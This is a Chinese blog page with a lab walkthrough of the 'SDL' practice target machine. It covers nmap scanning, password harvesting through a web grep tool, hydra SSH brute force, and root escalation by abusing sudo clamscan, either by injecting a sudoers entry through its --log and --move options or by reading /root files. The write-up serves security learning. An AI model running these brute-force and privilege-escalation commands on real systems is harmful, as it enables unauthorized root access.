@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>SDL 通关过程 · Radiant 的知识库</title>
+<meta name="description" content="nmap 扫描得到两个端口，22 和 80，接下来对 80 端口进行目录扫描。 得到三个目录，访问之后发现 /index.php 和 /index.php/login 是同一个界面。 访问 80 端口，是团队的介绍，最底下是三位群友。 访问 index.php 发现是个 grep 命令执行的 Web…">
+<meta name="author" content="Radiant">
+<meta name="theme-color" content="#161513">
+<link rel="icon" type="image/png" href="/img/favicon.png">
+<link rel="shortcut icon" href="/favicon.ico">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500&family=IBM+Plex+Sans:wght@400;500;600&family=Noto+Sans+SC:wght@400;500;600&display=swap">
+<link rel="stylesheet" href="/css/nightwatch.css">
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body class="nw-page-post">
+  <header class="nw-topbar">
+  <div class="nw-topbar-inner">
+    <a class="nw-brand" href="/">
+      <svg class="nw-brand-mark" width="18" height="18" viewBox="0 0 18 18" fill="none" aria-hidden="true">
+        <rect x="1.5" y="1.5" width="15" height="15" rx="3.5" stroke="currentColor" stroke-width="1.5"/>
+        <path d="M5.5 9H8L9.5 6L11 12L12.5 9H13.5" stroke="#e09f3e" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+      <span class="nw-brand-name">Radiant 的知识库</span>
+    </a>
+
+    <nav class="nw-nav" aria-label="主导航">
+      
+        <a class="nw-nav-link" href="/">文章</a>
+      
+        <a class="nw-nav-link" href="/archives/">归档</a>
+      
+        <a class="nw-nav-link" href="/categories/">分类</a>
+      
+        <a class="nw-nav-link" href="/tags/">标签</a>
+      
+    </nav>
+
+    <div class="nw-topbar-actions">
+      <button type="button" class="nw-search-trigger" id="nw-search-open" aria-label="搜索文章">
+        <svg class="nw-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/>
+        </svg>
+        <span class="nw-search-label">搜索</span>
+        <kbd class="nw-kbd">/</kbd>
+      </button>
+
+      
+        <a class="nw-icon-link" href="https://github.com/RRRadiant" target="_blank" rel="noopener noreferrer" aria-label="GitHub">
+          <svg class="nw-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4"/>
+            <path d="M9 18c-4.51 2-5-2-7-2"/>
+          </svg>
+        </a>
+      
+
+      <button type="button" class="nw-menu-toggle" id="nw-menu-toggle" aria-label="打开菜单" aria-expanded="false">
+        <svg class="nw-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <line x1="4" x2="20" y1="7" y2="7"/><line x1="4" x2="20" y1="12" y2="12"/><line x1="4" x2="20" y1="17" y2="17"/>
+        </svg>
+      </button>
+    </div>
+  </div>
+
+  <div class="nw-mobile-nav" id="nw-mobile-nav" hidden>
+    
+      <a class="nw-mobile-nav-link" href="/">文章</a>
+    
+      <a class="nw-mobile-nav-link" href="/archives/">归档</a>
+    
+      <a class="nw-mobile-nav-link" href="/categories/">分类</a>
+    
+      <a class="nw-mobile-nav-link" href="/tags/">标签</a>
+    
+    
+      <a class="nw-mobile-nav-link" href="https://github.com/RRRadiant" target="_blank" rel="noopener noreferrer">GitHub</a>
+    
+  </div>
+</header>
+
+  
+
+  <main class="nw-main" id="main-content">
+    
+<div class="nw-post-shell">
+  <article class="nw-article">
+    <nav class="nw-breadcrumb" aria-label="面包屑导航">
+      <a href="/">文章</a>
+      <span class="nw-sep" aria-hidden="true">/</span>
+      <a href="/categories/%E9%9D%B6%E5%9C%BA/">靶场</a>
+      <span class="nw-sep" aria-hidden="true">/</span>
+      <span class="nw-breadcrumb-current">SDL 通关过程</span>
+    </nav>
+
+    <header class="nw-article-header">
+      <h1 class="nw-article-title">SDL 通关过程</h1>
+      <div class="nw-article-meta">
+        <a class="nw-cat-label" href="/categories/%E9%9D%B6%E5%9C%BA/">
+          <span class="nw-dot" aria-hidden="true"></span>
+          <span>靶场</span>
+        </a>
+        <span class="nw-sep" aria-hidden="true">·</span>
+        <time class="nw-mono" datetime="2026-11-12T11:30:00.000Z">2026-11-12</time>
+        <span class="nw-sep" aria-hidden="true">·</span>
+        <span class="nw-mono">1330 字</span>
+        <span class="nw-sep" aria-hidden="true">·</span>
+        <span class="nw-mono">约 4 分钟</span>
+      </div>
+      
+        <div class="nw-article-tags">
+          
+            <a class="nw-inline-tag" href="/tags/Linux/">#Linux</a>
+          
+            <a class="nw-inline-tag" href="/tags/SDL/">#SDL</a>
+          
+            <a class="nw-inline-tag" href="/tags/clamscan/">#clamscan</a>
+          
+        </div>
+      
+    </header>
+
+    <div class="nw-prose" id="nw-prose">
+      <h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><code>nmap</code> 扫描得到两个端口，<code>22</code> 和 <code>80</code>，接下来对 <code>80</code> 端口进行目录扫描。</p>
+<p><img src="/images/image-20260426183918405.png"></p>
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>得到三个目录，访问之后发现 <code>/index.php</code> 和 <code>/index.php/login</code> 是同一个界面。</p>
+<p><img src="/images/image-20260426184145242.png"></p>
+<h2 id="访问端口、目录"><a href="#访问端口、目录" class="headerlink" title="访问端口、目录"></a>访问端口、目录</h2><p>访问 <code>80</code> 端口，是团队的介绍，最底下是三位群友。</p>
+<p><img src="/images/image-20260426185119897.png"></p>
+<p>访问 <code>index.php</code> 发现是个 <code>grep</code> 命令执行的 Web 版本，搜索模式写个 <code>.</code> 就可以，这样能把整个文件的内容拉出来。底下的选项我们需要选递归搜索和 perl，一方面是这样不会漏文件，另一方面是能够兼容正则表达式。这里对 <code>home</code> 路径下的所有文件进行了搜索，发现了密码。</p>
+<p><img src="/images/image-20260426185540515.png"></p>
+<p>得到密码可以尝试进行爆破，当然到这一步可以先读取 <code>user.txt</code>，这里一起演示。</p>
+<p><img src="/images/image-20260426185652576.png"></p>
+<p>接下来继续爆破，我们自定义密码和用户，这里用户应该就是 <code>80</code> 端口的那三位群友。这里使用 <code>hydra</code> 爆破，需要注意的是并发线程不要设置太高，设置过高会导致爆破失败，靶机会禁止你登录（看了群主的视频了解到后，自己也去测试了一下，确实会这样）。</p>
+<figure class="highlight plaintext"><div class="nw-code-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L users.txt -P passwords.txt ssh://192.168.209.141 -t 4</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/images/image-20260426190813651.png"></p>
+<p>这里只爆破出来两个用户密码，下面是并发线程设置过高的结果。</p>
+<p><img src="/images/image-20260426191256053.png"></p>
+<p>得到密码进行登录，接下来就是提权。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>sudo -l</code> 查看得到两个结果，一个是可以免密运行 <code>sudo id</code>，执行的结果是你会发现你成为了 root 用户，但是别高兴太早，这个 <code>id</code> 其实算是一个小坑吧。<code>clamscan</code> 是一个杀毒软件，我们可以利用这个进行提权。</p>
+<p><img src="/images/image-20260426192358051.png"></p>
+<p>接下来有两条线路，一条线路是 <code>log</code> 参数利用换行符实现注入，进行提权，另一条线路是 <code>move</code> 参数实现自定义病毒库任意写入，进行提权。</p>
+<h2 id="第一条线路（log-参数）"><a href="#第一条线路（log-参数）" class="headerlink" title="第一条线路（log 参数）"></a>第一条线路（log 参数）</h2><p>这里先复现一下群主的方案，写入公钥。</p>
+<p><img src="/images/image-20260426194629702.png"></p>
+<p>写入公钥这个方案我有尝试找过 AI，正如群主所言，AI 对写入公钥这个方案并不赞同，反而建议我去使用 ED25519 密钥。</p>
+<p><img src="/images/image-20260426194948378.png"></p>
+<p>最后成功登录。</p>
+<p>第二个方案就是 Sudoers 日志注入，这个方案是让 <code>clamscan</code> 将日志写入 sudo 的辅助配置目录，每次运行时都会自动读取目录下的所有文件，写入的内容是让 <code>sublarge</code> 用户可以在免密的情况下以任何用户执行任何命令。</p>
+<figure class="highlight plaintext"><div class="nw-code-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/clamscan --no-summary --log=/etc/sudoers.d/exploit &quot;</span><br><span class="line">sublarge ALL=(ALL:ALL) NOPASSWD: ALL</span><br><span class="line">&quot;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/images/image-20260426202504610.png"></p>
+<h2 id="第二条线路（move-参数）"><a href="#第二条线路（move-参数）" class="headerlink" title="第二条线路（move 参数）"></a>第二条线路（move 参数）</h2><p>首先先制造提权配置文件。</p>
+<figure class="highlight plaintext"><div class="nw-code-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;sublarge ALL=(ALL:ALL) NOPASSWD: ALL&quot; &gt; /tmp/pwn</span><br></pre></td></tr></table></div></figure>
+
+<p>其次伪造 YARA 病毒库。</p>
+<figure class="highlight plaintext"><div class="nw-code-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;rule a &#123;strings: $a=&quot;sublarge&quot; condition: $a&#125;&#x27; &gt; /tmp/a.yara</span><br></pre></td></tr></table></div></figure>
+
+<p>最后触发并提权。</p>
+<figure class="highlight plaintext"><div class="nw-code-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/clamscan -d /tmp/a.yara --move=/etc/sudoers.d/ /tmp/pwn</span><br><span class="line">sudo su</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="/images/image-20260426201244782.png"></p>
+<hr>
+<h2 id="我的方案"><a href="#我的方案" class="headerlink" title="我的方案"></a>我的方案</h2><p>最后分享一下我的方案。我首先伪造病毒库，利用 <code>clamscan</code> 的 <code>-r</code> 功能先查看了 <code>root</code> 路径下的所有文件，发现有个 <code>sdl.txt</code>，感觉不对，就尝试读取，读到之后我想着尝试一下，万一是 root 密码，结果真成功了。</p>
+<p>首先还是先伪造病毒库。</p>
+<figure class="highlight plaintext"><div class="nw-code-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">touch empty.yara</span><br></pre></td></tr></table></div></figure>
+
+<p>其次查看 <code>root</code> 路径下的所有文件，利用 <code>clamscan</code> 的 <code>-r</code> 功能查看 <code>root</code> 路径下的所有文件。</p>
+<figure class="highlight plaintext"><div class="nw-code-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/clamscan -r /root --no-summary</span><br></pre></td></tr></table></div></figure>
+
+<p>然后读取 <code>sdl.txt</code>。</p>
+<figure class="highlight plaintext"><div class="nw-code-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/clamscan --no-summary -d empty.yara -f /root/sdl.txt 2&gt;&amp;1 | sed -nE &#x27;s/^(.*): No such file or directory$/\1/p&#x27;</span><br></pre></td></tr></table></div></figure>
+
+<p>获得密码后进行登录，最后成功提权。</p>
+<p><img src="/images/image-20260426204118491.png"></p>
+<hr>
+<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><figure class="highlight plaintext"><div class="nw-code-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat tmp|sed -nr &#x27;/No s/s/:.+$//gp&#x27;</span><br></pre></td></tr></table></div></figure>
+
+<p><code>-nr</code>：只打印结果同时拓展正则，<code>-n</code> 是只打印结果，<code>-r</code> 拓展正则。</p>
+<p><code>/No s/</code>：指的就是 <code>No such file or directory</code>。</p>
+<p><code>s/  //</code>：替换命令，中间的 <code>:.+$</code> 指的就是将冒号后的字符替换成空。</p>
+<p><code>g</code>：全局替换（global）。</p>
+<p><code>p</code>：打印。</p>
+<p>最后理解，先找到 <code>No such file or directory</code>，然后将其替换成空，并且是全局替换，最后打印出来。</p>
+<p>替换法。</p>
+<figure class="highlight plaintext"><div class="nw-code-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat tmp|grep -P &#x27;(?&lt;=^).*(?=: No)&#x27; -o</span><br></pre></td></tr></table></div></figure>
+
+<p><code>-P</code>：开启 Perl 兼容正则。</p>
+<p><code>(?&lt;=^).*(?=: No)</code>：拆分成三部分。</p>
+<p>首先 <code>(?&lt;=^)</code> 指的是我要匹配的部分是从开头开始的，有了 <code>-P</code> 参数，就能解释为什么使用 <code>^</code>，因为 <code>^</code> 在正则中代表着开头。</p>
+<p>其次 <code>.*</code> 可以看作是匹配任何长度的字符。</p>
+<p>最后 <code>(?=: No)</code> 指的是我要匹配的字符最右边是 <code>: No</code>，也就是 <code>: No such file or directory</code>。</p>
+<p><code>-o</code>：只显示你匹配的部分。</p>
+<p>匹配法。</p>
+<figure class="highlight plaintext"><div class="nw-code-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat tmp|awk -F&#x27;: No such&#x27; &#x27;NF&gt;1&#123;print $1&#125;&#x27;</span><br></pre></td></tr></table></div></figure>
+
+<p><code>-F</code>：指定你要找的字符，也就是 <code>: No such</code>。</p>
+<p><code>NF&gt;1</code>：指的是列数大于 1。假设我们现在要对 <code>root.txt: No such file or directory</code> 操作，当系统找到 <code>: No such</code> 时，会在 <code>:</code> 前切一刀，这里就被分成了两列，一列是 <code>root.txt</code>，另一列就是 <code>: No such file or directory</code>，因此，如果列数大于 1，就说明成功找到并进行了切割，这个时候第一列就会记作 <code>$1</code>，第二列就会记作 <code>$2</code>。</p>
+<p><code>{print $1}</code>：最后就是打印第一列，也就是我们想要的东西。</p>
+<p>切割法。</p>
+
+    </div>
+
+    <nav class="nw-post-nav" aria-label="上下篇导航">
+      
+        <div></div>
+      
+      
+        <a class="nw-post-nav-card is-next" href="/2026/11/12/Rd%E9%9D%B6%E6%9C%BA%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF/">
+          <span class="nw-post-nav-label">下一篇</span>
+          <span class="nw-post-nav-title">Rd 靶机设计思路</span>
+        </a>
+      
+    </nav>
+  </article>
+
+  <aside class="nw-toc-rail" aria-label="文章目录">
+    <div class="nw-toc-sticky">
+      
+        <section class="nw-toc-block">
+          <div class="nw-toc-head">
+            <h2 class="nw-side-title">本页目录</h2>
+            <span class="nw-mono nw-muted" id="nw-read-progress">0%</span>
+          </div>
+          <nav class="nw-toc-nav" id="nw-toc-nav">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AE%E7%AB%AF%E5%8F%A3%E3%80%81%E7%9B%AE%E5%BD%95"><span class="toc-text">访问端口、目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%9D%A1%E7%BA%BF%E8%B7%AF%EF%BC%88log-%E5%8F%82%E6%95%B0%EF%BC%89"><span class="toc-text">第一条线路（log 参数）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%9D%A1%E7%BA%BF%E8%B7%AF%EF%BC%88move-%E5%8F%82%E6%95%B0%EF%BC%89"><span class="toc-text">第二条线路（move 参数）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E6%96%B9%E6%A1%88"><span class="toc-text">我的方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-text">拓展</span></a></li></ol>
+          </nav>
+        </section>
+      
+
+      
+        <section class="nw-toc-block">
+          <h2 class="nw-side-title">同分类记录</h2>
+          <ul class="nw-related-list">
+            
+              <li>
+                <a class="nw-related-link" href="/2026/11/12/Rd%E9%9D%B6%E6%9C%BA%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF/">
+                  <span class="nw-related-title">Rd 靶机设计思路</span>
+                  <time class="nw-mono nw-muted">2026-11-12</time>
+                </a>
+              </li>
+            
+              <li>
+                <a class="nw-related-link" href="/2026/11/09/HackMyVM-Venus%E9%80%9A%E5%85%B3%E8%BF%87%E7%A8%8B/">
+                  <span class="nw-related-title">HackMyVM Venus 通关过程</span>
+                  <time class="nw-mono nw-muted">2026-11-09</time>
+                </a>
+              </li>
+            
+              <li>
+                <a class="nw-related-link" href="/2025/10/19/upload-labs%E9%80%9A%E5%85%B3%E8%BF%87%E7%A8%8B/">
+                  <span class="nw-related-title">upload-labs 通关过程</span>
+                  <time class="nw-mono nw-muted">2025-10-19</time>
+                </a>
+              </li>
+            
+              <li>
+                <a class="nw-related-link" href="/2025/10/19/Sql%E6%B3%A8%E5%85%A5/">
+                  <span class="nw-related-title">SQL 注入从手工到报错注入（sqli-labs）</span>
+                  <time class="nw-mono nw-muted">2025-10-19</time>
+                </a>
+              </li>
+            
+          </ul>
+        </section>
+      
+
+      <div class="nw-toc-actions">
+        <a class="nw-toc-action" href="#main-content">
+          <svg class="nw-icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="m18 15-6-6-6 6"/>
+          </svg>
+          <span>回到顶部</span>
+        </a>
+        <a class="nw-toc-action" href="/">
+          <svg class="nw-icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="m12 19-7-7 7-7"/><path d="M19 12H5"/>
+          </svg>
+          <span>返回列表</span>
+        </a>
+      </div>
+    </div>
+  </aside>
+</div>
+
+  </main>
+
+  <footer class="nw-footer">
+  <div class="nw-footer-inner">
+    <div class="nw-footer-left">
+      <span class="nw-footer-title">Radiant 的知识库</span>
+      <span class="nw-sep" aria-hidden="true">·</span>
+      <span>作者 Radiant</span>
+      <span class="nw-sep" aria-hidden="true">·</span>
+      <span class="nw-mono">10 篇记录</span>
+    </div>
+    <div class="nw-footer-right">
+      
+        <a href="https://github.com/RRRadiant" target="_blank" rel="noopener noreferrer">GitHub</a>
+        <span class="nw-sep" aria-hidden="true">·</span>
+      
+      <a href="/archives/">归档</a>
+      <span class="nw-sep" aria-hidden="true">·</span>
+      <span class="nw-credit">Hexo · Design guided by <a href="https://heydamir.design/unslop" target="_blank" rel="noopener noreferrer">unslop</a> (CC BY 4.0)</span>
+    </div>
+  </div>
+</footer>
+
+
+  
+  <div class="nw-search-modal" id="nw-search-modal" hidden role="dialog" aria-modal="true" aria-label="搜索文章">
+    <div class="nw-search-backdrop" data-close-search></div>
+    <div class="nw-search-dialog">
+      <div class="nw-search-input-row">
+        <svg class="nw-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+          <circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/>
+        </svg>
+        <input type="search" id="nw-search-input" class="nw-search-input" placeholder="搜索标题、分类或标签" autocomplete="off">
+        <button type="button" class="nw-search-esc" data-close-search>Esc</button>
+      </div>
+      <div class="nw-search-results" id="nw-search-results"></div>
+    </div>
+  </div>
+
+  <div class="nw-lightbox" id="nw-lightbox" hidden role="dialog" aria-modal="true" aria-label="图片预览">
+    <button type="button" class="nw-lightbox-close" id="nw-lightbox-close" aria-label="关闭预览">
+      <svg class="nw-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+        <path d="M18 6 6 18"/><path d="m6 6 12 12"/>
+      </svg>
+    </button>
+    <img id="nw-lightbox-img" src="" alt="">
+  </div>
+
+  <script id="nw-search-data" type="application/json">[{"title":"SDL 通关过程","url":"/2026/11/12/SDL%E9%80%9A%E5%85%B3%E8%BF%87%E7%A8%8B/","date":"2026-11-12","category":"靶场","tags":["Linux","SDL","clamscan"],"excerpt":"nmap 扫描得到两个端口，22 和 80，接下来对 80 端口进行目录扫描。 得到三个目录，访问之后发现 /index.php 和 /index.php/login 是同一个界面。 访问 80 端口，是团队的介绍，最底…"},{"title":"Rd 靶机设计思路","url":"/2026/11/12/Rd%E9%9D%B6%E6%9C%BA%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF/","date":"2026-11-12","category":"靶场","tags":["Linux","Rd","靶机设计"],"excerpt":"Rd 是我做的第一台 Linux 靶机，就是想尝试一次制作靶机，所以整体链条没有做得很长，同时也让 AI 帮助了我。刚开始的想法其实很简单：入口设计的是在 Web 端通过 Redis 未授权访问，然后提权是在 GitHu…"},{"title":"HackMyVM Venus 通关过程","url":"/2026/11/09/HackMyVM-Venus%E9%80%9A%E5%85%B3%E8%BF%87%E7%A8%8B/","date":"2026-11-09","category":"靶场","tags":["HackMyVM","Linux","Venus","zip","grep"],"excerpt":"任务是：sophia藏了她的密码在这个文件夹中的一个隐藏文件，找到并登录 我们发现一个.myhiddenpazz文件，cat之后是密码 切换到sophia，得到第一个flag 成功得到flag 任务是：angela保存了…"},{"title":"NSSCTF RCE 做题记录","url":"/2025/11/05/NSSCTF%EF%BC%88RCE%EF%BC%89%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","date":"2025-11-05","category":"Web","tags":["NSSCTF","RCE"],"excerpt":"通过题目我们知道这道题跟vim有关 补充：vim编辑的index.php文件，在编辑状态强制退出终端，会在同目录下产生一个.index.php.swp文件，我们可以使用vim -r .index.php.swp恢复文件…"},{"title":"NSSCTF 反序列化做题记录","url":"/2025/11/03/NSSCTF%EF%BC%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%89%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","date":"2025-11-03","category":"Web","tags":["NSSCTF","反序列化","PHP"],"excerpt":"打开环境，我们分析一下代码 通过分析我们可以知道，需要GET传参info，程序会把info反序列化成数组，再拿数组里的username和password跟原来的值比较，而且注释里说了here I changed thos…"},{"title":"NSSCTF 流量分析做题记录","url":"/2025/10/27/NSSCTF%EF%BC%88%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%EF%BC%89%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","date":"2025-10-27","category":"Misc","tags":["NSSCTF","流量分析","Wireshark"],"excerpt":"通过题目我们可以知道黑客修改了配置文件，而配置文件是在etc目录下的，所以我们可以通过过滤重点关注POST包和etc，命令为： 我们可以得到以下数据包 显而易见我们找到了配置文件的绝对路径，成功找到flag 首先题目告诉…"},{"title":"NSSCTF 文件包含与 PHP 伪协议做题记录","url":"/2025/10/26/NSSCTF%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB+php%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%89%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","date":"2025-10-26","category":"Web","tags":["NSSCTF","文件包含","PHP伪协议"],"excerpt":"这是一道文件包含+php伪协议的题目，分析代码发现是通过post上传flag的，那我们可以先通过post尝试访问flag.php文件 通过base64解码，我们得到源代码，经过分析发现需要我们输入超过800个字符才能读取…"},{"title":"NSSCTF 文件上传做题记录","url":"/2025/10/24/NSSCTF%EF%BC%88Upload%EF%BC%89%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","date":"2025-10-24","category":"Web","tags":["文件上传","NSSCTF"],"excerpt":"打开环境，上传php，jpg，gif等文件，发现都提示Bad filename，分析源代码发现/source 因此在连接末尾加上 /source，自动下载 www.zip 压缩包，解压缩发现是一个 python 文件，打…"},{"title":"upload-labs 通关过程","url":"/2025/10/19/upload-labs%E9%80%9A%E5%85%B3%E8%BF%87%E7%A8%8B/","date":"2025-10-19","category":"靶场","tags":["文件上传","upload-labs"],"excerpt":"核心原理：仅通过前端JavaScript函数（checkFile()）校验文件后缀，未在后端做任何限制，直接修改前端代码即可绕过。 首先上传一个php文件提示： 那么将php文件改为jpg格式，并用bp抓包，将jpg后缀…"},{"title":"SQL 注入从手工到报错注入（sqli-labs）","url":"/2025/10/19/Sql%E6%B3%A8%E5%85%A5/","date":"2025-10-19","category":"靶场","tags":["SQL注入","sqli-labs"],"excerpt":"练习靶场：米奇妙妙屋 优先观察那种页面存在传值或者查询的地方。比如url中的GET型传参，如?id=1 例如： 或者是搜索框，前端将用户输入的数据代入到数据库中进行查询，这种以POST方法进行发送数据。如下这种地方 或者…"}]</script>
+  <script src="/js/nightwatch.js" defer></script>
+</body>
+</html>
